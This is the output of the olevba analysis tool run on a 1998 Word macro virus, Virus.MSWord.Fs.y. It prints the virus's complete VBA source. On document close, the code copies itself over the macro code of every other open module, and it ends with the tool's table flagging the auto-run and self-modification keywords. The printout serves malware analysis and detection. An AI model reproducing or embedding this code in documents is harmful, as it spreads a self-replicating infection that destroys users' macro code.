olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.y
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.y - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - 18th
Sub AutoClose(): Document_Close: End Sub
Private Sub Document_Close()
 On Error Resume Next
 For ι = 1 To VBE.CodePanes.Count
 Set υ = VBE.CodePanes(ι).CodeModule
    If υ.Find("~^^~", 0, 0, 0, 0) And ν = 0 Then
        λ = υ.Lines(1, υ.CountOfLines): ν = 1: ι = 0
    End If
    If Not υ.Find("~^^~", 0, 0, 0, 0) And ν = 1 Then
        υ.DeleteLines 1, υ.CountOfLines: υ.InsertLines 1, λ
    End If
 Next
End Sub
Private Sub UserForm_Initialize(): Document_Close: End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

